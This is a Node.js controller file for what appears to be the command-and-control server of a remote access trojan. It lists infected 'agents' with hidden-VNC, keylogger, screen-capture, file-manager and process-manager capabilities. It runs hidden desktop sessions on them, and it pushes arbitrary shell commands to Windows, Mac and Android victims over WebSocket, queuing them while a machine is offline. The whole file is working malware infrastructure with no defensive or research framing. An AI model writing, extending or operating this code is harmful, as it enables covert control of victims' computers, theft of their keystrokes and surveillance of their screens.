const Client = require('../models/Client');
const Task = require('../models/Task');
const catchAsync = require('../utils/catchAsync');
const AppError = require('../utils/appError');

const VALID_HVNC_QUALITIES = ['low', 'medium', 'high'];
const HVNC_QUALITY_PRESETS = {
  low: { fps: 10, compression: 'high' },
  medium: { fps: 15, compression: 'medium' },
  high: { fps: 24, compression: 'low' }
};
const ACTIVE_HVNC_STATUSES = ['starting', 'active', 'stopping'];

const parseHvncStartOptions = (body = {}) => {
  const qualityRaw = typeof body.quality === 'string' ? body.quality.toLowerCase() : 'medium';
  const quality = VALID_HVNC_QUALITIES.includes(qualityRaw) ? qualityRaw : 'medium';

  const preset = HVNC_QUALITY_PRESETS[quality] || HVNC_QUALITY_PRESETS.medium;
  const requestedFps = body.fps !== undefined ? parseInt(body.fps, 10) : preset.fps;
  const fps = Number.isFinite(requestedFps) ? Math.min(60, Math.max(1, requestedFps)) : preset.fps;

  const mode = typeof body.mode === 'string' && body.mode.length ? body.mode : 'desktop';
  const additionalSettings = typeof body.settings === 'object' && body.settings !== null ? body.settings : {};

  return {
    quality,
    fps,
    mode,
    compression: preset.compression,
    settings: {
      quality,
      fps,
      compression: preset.compression,
      mode,
      ...additionalSettings
    }
  };
};

/**
 * Get all agents with filtering options
 */
exports.getAllAgents = catchAsync(async (req, res, next) => {
  const { platform, status, feature } = req.query;
  
  // Build filter object
  const filter = {};
  
  if (platform) {
    filter.operatingSystem = platform;
  }
  
  if (status === 'online') {
    // Consider clients active if heartbeat within last 5 minutes
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    filter.lastHeartbeat = { $gte: fiveMinutesAgo };
  } else if (status === 'offline') {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    filter.lastHeartbeat = { $lt: fiveMinutesAgo };
  }
  
  if (feature) {
    filter['capabilities.features'] = feature;
  }
  
  const agents = await Client.find(filter).select('-authToken');
  
  // Transform data for frontend
  const transformedAgents = agents.map(agent => {
    const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
    
    return {
      id: agent._id,
      name: agent.computerName,
      ip: agent.ipAddress,
      platform: agent.operatingSystem,
      status: isOnline ? 'Online' : 'Offline',
      lastSeen: agent.lastHeartbeat,
      version: agent.osVersion || 'Unknown',
      features: {
        hvnc: agent.capabilities.features.includes('hvnc'),
        keylogger: agent.capabilities.features.includes('keylogger'),
        screenCapture: agent.capabilities.features.includes('screenCapture'),
        fileManager: agent.capabilities.features.includes('fileManager'),
        processManager: agent.capabilities.features.includes('processManager')
      }
    };
  });
  
  res.status(200).json({
    status: 'success',
    results: transformedAgents.length,
    data: {
      agents: transformedAgents
    }
  });
});

/**
 * Get current HVNC session status
 */
exports.getHvncStatus = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const requestedSessionId = req.params.sessionId || req.query.sessionId;

  const agent = await Client.findOne({ uuid: agentId }).lean();

  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }

  const session = agent.hvncSession || null;

  if (!session || !session.sessionId) {
    return res.status(200).json({
      status: 'success',
      data: {
        session: null
      }
    });
  }

  if (requestedSessionId && requestedSessionId !== session.sessionId) {
    return next(new AppError('No HVNC session found with the provided sessionId', 404));
  }

  return res.status(200).json({
    status: 'success',
    data: {
      session
    }
  });
});

/**
 * Forward HVNC control command to agent
 */
exports.sendHvncCommand = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { sessionId, command } = req.body || {};

  if (!command || typeof command !== 'object') {
    return next(new AppError('HVNC command payload is required', 400));
  }

  if (!command.type || typeof command.type !== 'string') {
    return next(new AppError('HVNC command type is required', 400));
  }

  const agent = await Client.findOne({ uuid: agentId });

  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }

  const activeSession = agent.hvncSession;
  if (!activeSession || !activeSession.sessionId) {
    return next(new AppError('No active HVNC session for this agent', 400));
  }

  if (sessionId && sessionId !== activeSession.sessionId) {
    return next(new AppError('Provided sessionId does not match active HVNC session', 400));
  }

  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);

  if (!clientConnection) {
    return next(new AppError('Client WebSocket connection not found', 400));
  }

  const hvncMessage = {
    type: 'hvnc_command',
    sessionId: activeSession.sessionId,
    command: {
      type: command.type,
      payload: typeof command.payload === 'object' && command.payload !== null ? command.payload : {},
      timestamp: new Date().toISOString()
    }
  };

  if (command.meta) {
    hvncMessage.command.meta = command.meta;
  }

  if (command.sequence !== undefined) {
    hvncMessage.command.sequence = command.sequence;
  }

  try {
    clientConnection.send(JSON.stringify(hvncMessage));
  } catch (error) {
    console.error('Failed to forward HVNC command:', error);
    return next(new AppError('Failed to communicate with agent', 500));
  }

  await Client.findOneAndUpdate(
    { uuid: agentId },
    {
      $set: {
        'hvncSession.status': 'active',
        'hvncSession.lastUpdate': new Date()
      },
      $unset: {
        'hvncSession.error': ''
      }
    }
  );

  return res.status(200).json({
    status: 'success',
    message: 'HVNC command relayed to agent',
    data: {
      sessionId: activeSession.sessionId
    }
  });
});

/**
 * Request HVNC screenshot capture
 */
exports.captureHvncScreenshot = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { sessionId, options } = req.body || {};

  const agent = await Client.findOne({ uuid: agentId });

  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }

  const activeSession = agent.hvncSession;
  if (!activeSession || !activeSession.sessionId) {
    return next(new AppError('No active HVNC session for this agent', 400));
  }

  if (sessionId && sessionId !== activeSession.sessionId) {
    return next(new AppError('Provided sessionId does not match active HVNC session', 400));
  }

  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);

  if (!clientConnection) {
    return next(new AppError('Client WebSocket connection not found', 400));
  }

  const hvncMessage = {
    type: 'hvnc_screenshot',
    sessionId: activeSession.sessionId,
    options: typeof options === 'object' && options !== null ? options : {}
  };

  try {
    clientConnection.send(JSON.stringify(hvncMessage));
  } catch (error) {
    console.error('Failed to request HVNC screenshot:', error);
    return next(new AppError('Failed to communicate with agent', 500));
  }

  await Client.findOneAndUpdate(
    { uuid: agentId },
    {
      $set: {
        'hvncSession.lastUpdate': new Date()
      }
    }
  );

  return res.status(200).json({
    status: 'success',
    message: 'HVNC screenshot request sent to agent',
    data: {
      sessionId: activeSession.sessionId
    }
  });
});

/**
 * Get a single agent by ID
 */
exports.getAgent = catchAsync(async (req, res, next) => {
  const agent = await Client.findOne({ uuid: req.params.id });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
  
  const transformedAgent = {
    id: agent._id,
    name: agent.computerName,
    ip: agent.ipAddress,
    platform: agent.operatingSystem,
    status: isOnline ? 'Online' : 'Offline',
    lastSeen: agent.lastHeartbeat,
    version: agent.osVersion || 'Unknown',
    features: {
      hvnc: agent.capabilities.features.includes('hvnc'),
      keylogger: agent.capabilities.features.includes('keylogger'),
      screenCapture: agent.capabilities.features.includes('screenCapture'),
      fileManager: agent.capabilities.features.includes('fileManager'),
      processManager: agent.capabilities.features.includes('processManager')
    },
    systemInfo: agent.systemInfo || {}
  };
  
  res.status(200).json({
    status: 'success',
    data: {
      agent: transformedAgent
    }
  });
});

/**
 * Send command to agent
 */
exports.sendCommand = catchAsync(async (req, res, next) => {
  const { command, params = {} } = req.body;
  const agentId = req.params.id;
  const createdBy = req.user ? req.user.id : 'system'; // Get user ID from auth
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  // Generate task ID
  const taskId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

  // Create task in database (always create, regardless of online status)
  const task = new Task({
    taskId: taskId,
    agentUuid: agentId,
    command: command,
    params: params,
    createdBy: createdBy,
    platform: agent.operatingSystem || 'unknown',
    queue: {
      state: 'pending',
      attempts: 0,
      priority: 0
    }
  });

  await task.save();
  console.log('Task created:', taskId);

  // Broadcast task creation to admin sessions
  const wsHandler = require('../configs/ws.handler');
  wsHandler.broadcastToAdminSessions({
    type: 'task_created',
    task: task.toObject(),
    timestamp: new Date().toISOString()
  });

  // Check if agent is online and has WebSocket connection
  const isOnline = agent.status === 'online' && new Date(agent.lastHeartbeat) > new Date(Date.now() - 2 * 60 * 1000);
  const clientConnection = wsHandler.getClientConnection(agent.uuid);

  if (isOnline && clientConnection) {
    // Agent is online - send command immediately
    try {
      // Prepare command payload
      let commandPayload = {
        type: 'command',              // ADD THIS - critical for routing
        cmd: 'execute',
        taskId: taskId,
        command: command,
        params: params,
        timestamp: new Date().toISOString()
      };

      // Platform-specific command formatting
      switch (agent.operatingSystem) {
        case 'windows':
          commandPayload.shell = 'cmd';
          break;
        case 'mac':
          commandPayload.shell = 'bash';
          break;
        case 'android':
          commandPayload.shell = 'sh';
          break;
        default:
          commandPayload.shell = 'sh';
      }

      console.log('Sending command to online client:', commandPayload);
      clientConnection.send(JSON.stringify(commandPayload));
      
      // Update task as sent
      await Task.findOneAndUpdate(
        { taskId: taskId },
        { 
          $set: { 
            'queue.state': 'sent',
            sentAt: new Date(),
            'queue.attempts': 1,
            'queue.lastAttemptAt': new Date()
          }
        }
      );

      // Broadcast task update to admin sessions
      const updatedTask = await Task.findOne({ taskId }).lean();
      wsHandler.broadcastToAdminSessions({
        type: 'task_updated',
        task: updatedTask,
        timestamp: new Date().toISOString()
      });

      console.log('Command sent successfully to client:', agent.uuid);

      res.status(200).json({
        status: 'success',
        message: `Command "${command}" sent to agent`,
        data: {
          taskId: taskId,
          agentId,
          command,
          params,
          status: 'sent'
        }
      });
    } catch (wsError) {
      console.error('Failed to send command to client:', wsError);
      // Revert task to pending state
      await Task.findOneAndUpdate(
        { taskId: taskId },
        { 
          $set: { 
            'queue.state': 'pending',
            'queue.reason': 'WebSocket send failed'
          }
        }
      );
      return next(new AppError('Failed to send command to agent', 500));
    }
  } else {
    // Agent is offline - command will be queued
    console.log('Agent is offline, command queued:', taskId);
    
    res.status(200).json({
      status: 'success',
      message: `Command "${command}" queued for agent (offline)`,
      data: {
        taskId: taskId,
        agentId,
        command,
        params,
        status: 'queued'
      }
    });
  }
});

/**
 * Start HVNC session
 */
exports.startHvncSession = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const hvncOptions = parseHvncStartOptions(req.body);
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  // Check if agent is online
  const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
  if (!isOnline) {
    return next(new AppError('Agent is offline and cannot start HVNC session', 400));
  }
  
  // Check if agent supports HVNC
  if (!agent.capabilities || !Array.isArray(agent.capabilities.features) || !agent.capabilities.features.includes('hvnc')) {
    return next(new AppError('Agent does not support HVNC', 400));
  }

  if (agent.hvncSession && agent.hvncSession.sessionId && ACTIVE_HVNC_STATUSES.includes(agent.hvncSession.status)) {
    return next(new AppError('HVNC session already active for this agent', 409));
  }
  
  // Get WebSocket connection
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);
  
  if (!clientConnection) {
    return next(new AppError('Client WebSocket connection not found', 400));
  }
  
  // Generate session ID
  const sessionId = `hvnc_${agent.uuid}_${Date.now()}`;
  
  // Send HVNC start command to client
  const hvncCommand = {
    type: 'hvnc_start',
    sessionId,
    settings: hvncOptions.settings
  };
  
  try {
    clientConnection.send(JSON.stringify(hvncCommand));
    
    // Update agent with HVNC session info
    await Client.findOneAndUpdate({ uuid: agentId }, {
      $set: {
        hvncSession: {
          sessionId,
          status: 'starting',
          quality: hvncOptions.quality,
          fps: hvncOptions.fps,
          settings: hvncOptions.settings,
          startedAt: new Date(),
          lastUpdate: new Date()
        }
      }
    });
    
    res.status(200).json({
      status: 'success',
      message: 'HVNC session starting',
      data: {
        sessionId,
        agentId,
        quality: hvncOptions.quality,
        fps: hvncOptions.fps,
        status: 'starting',
        settings: hvncOptions.settings
      }
    });
  } catch (wsError) {
    console.error('Failed to send HVNC start command:', wsError);
    return next(new AppError('Failed to communicate with agent', 500));
  }
});

/**
 * Stop HVNC session
 */
exports.stopHvncSession = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { sessionId, clear = false } = req.body || {};
  
  const agent = await Client.findOne({ uuid: agentId });
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }

  const activeSession = agent.hvncSession;
  if (!activeSession || !activeSession.sessionId) {
    return next(new AppError('No active HVNC session for this agent', 400));
  }

  if (sessionId && sessionId !== activeSession.sessionId) {
    return next(new AppError('Provided sessionId does not match active HVNC session', 400));
  }
  
  // Get WebSocket connection
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);

  if (clientConnection) {
    // Send HVNC stop command to client
    const hvncCommand = {
      type: 'hvnc_stop',
      sessionId: activeSession.sessionId
    };
    
    try {
      clientConnection.send(JSON.stringify(hvncCommand));
    } catch (wsError) {
      console.error('Failed to send HVNC stop command:', wsError);
    }
  }

  const updateOperation = clear
    ? { $unset: { hvncSession: 1 } }
    : {
        $set: {
          'hvncSession.status': 'stopped',
          'hvncSession.lastUpdate': new Date(),
          'hvncSession.endedAt': new Date()
        }
      };

  await Client.findOneAndUpdate({ uuid: agentId }, updateOperation);

  res.status(200).json({
    status: 'success',
    message: clientConnection ? 'HVNC session stop requested' : 'HVNC session state cleared',
    data: {
      sessionId: activeSession.sessionId,
      agentId,
      status: clear ? 'cleared' : 'stopped',
      connectionNotified: Boolean(clientConnection)
    }
  });
});

/**
 * Get HVNC session status (legacy - kept for backward compatibility)
 */
exports.getHvncSessionStatus = exports.getHvncStatus;